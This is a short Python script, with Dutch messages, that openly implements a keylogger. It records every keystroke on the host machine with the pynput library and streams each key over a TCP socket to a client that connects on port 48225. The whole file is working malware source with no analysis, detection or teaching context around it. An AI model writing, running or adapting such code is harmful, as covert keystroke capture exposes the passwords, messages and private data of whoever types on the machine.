import socket
import random
from pynput.keyboard import Listener

def start_keylogger_server():
    host = '127.0.0.1'
    port = 48225
    print(f"Keylogger server draait op poort {port}")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((host, port))
        server_socket.listen(1)
        client_socket, client_addr = server_socket.accept()
        print(f"Verbonden met {client_addr}")

        def on_press(key):
            try:
                client_socket.sendall(f"Toetsaanslag: {key.char}\n".encode())
            except AttributeError:
                client_socket.sendall(f"Speciale toets: {key}\n".encode())

        with Listener(on_press=on_press) as listener:
            listener.join()


start_keylogger_server()
